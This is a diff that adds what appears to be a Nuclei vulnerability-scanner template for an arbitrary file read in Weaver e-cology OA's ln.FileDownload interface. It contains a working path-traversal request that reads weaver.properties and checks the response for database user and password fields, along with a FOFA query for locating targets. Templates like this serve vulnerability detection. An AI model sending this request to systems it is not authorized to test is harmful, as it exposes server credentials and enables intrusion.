@@ -1,0 +1,27 @@
+id: weaver-ecology-ln-filedownload-fileread
+
+info:
+  name: 泛微 OA E-Cology ln.FileDownload - fileread
+  author: leadlife
+  severity: high
+  description: 泛微e-cology是一款由泛微网络科技开发的协同管理平台。泛微OA ln.FileDownload 接口存在任意文件读取漏洞，攻击者通过漏洞可以获取服务器任意文件。
+  reference: 
+    - https://blog.csdn.net/qq_37113223/article/details/138793198
+    - https://wiki.wy876.cn/#/%E6%B3%9B%E5%BE%AEOA-E-Cology-FileDownload%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E
+  metadata:
+    verified: false
+    fofa-query: app="泛微-OA（e-cology）"
+  tags: fileread,weaver,ecology,oa
+
+http:
+  - raw:
+      - |
+        GET /weaver/ln.FileDownload?fpath=../ecology/WEB-INF/prop/weaver.properties HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains_all(body,'ecology.user','ecology.password')
+        condition: and
